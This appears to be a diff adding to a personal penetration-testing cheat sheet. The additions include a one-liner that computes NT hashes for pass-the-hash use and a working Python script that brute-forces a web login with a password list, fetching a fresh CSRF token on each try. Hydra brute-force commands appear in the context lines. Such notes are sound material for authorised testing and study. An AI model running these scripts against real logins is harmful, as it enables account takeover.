@@ -9,6 +9,9 @@
 ### Identify the hash
 ```bash
 hashid '<hash>' ; hash-identifier ; nth '<hash>'      # name-that-hash
+# NT hash from a known/cracked password (for PtH / ticketer / -k workflows):
+python3 -c 'import hashlib;print(hashlib.new("md4","PASSWORD".encode("utf-16le")).hexdigest())'
+# (NT hash == "the NTLM hash"; NetNTLMv2 is a crackable challenge-response, NOT passable — see AD file)
 ```
 
 ### hashcat (your RTX 3070 setup — CUDA)
@@ -41,6 +44,20 @@ hydra -L users.txt -P pass.txt $IP smb
 hydra -l admin -P rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" 
 hydra -l user -P pass.txt ftp://$IP
 ```
+**Hydra can't beat a CSRF/anti-forgery token.** If the login form has a hidden per-request token (`name="csrf"`, `__RequestVerificationToken`, etc.) the app validates server-side, Hydra reuses a stale token and the server returns "invalid token" for *every* try — so your failure string never matches and **every password looks like a hit** (false positives). Hydra can't scrape+reinject a fresh token per request. Drop to a tiny Python session script:
+```python
+import requests, re, sys
+URL = "http://TARGET/login"
+for pw in open("rockyou.txt", encoding="latin-1", errors="ignore"):
+    pw = pw.strip()
+    s = requests.Session()                       # fresh session each try
+    tok = re.search(r'name="csrf" value="([^"]+)"', s.get(URL).text).group(1)
+    r = s.post(URL, data={"csrf": tok, "username": "admin", "password": pw},
+               allow_redirects=False)
+    if r.status_code == 302:                     # or: "Wrong" not in r.text
+        print("[+] FOUND:", pw); sys.exit()
+```
+> Key the success check on a **reliable** signal (a 302 redirect to a dashboard is best; otherwise the *absence* of both the "wrong password" AND the "invalid token" strings). Two requests per attempt makes full rockyou slow — thread it or use a targeted list (cewl/`--rules`).
 
 ### Crack /etc/shadow
 ```bash
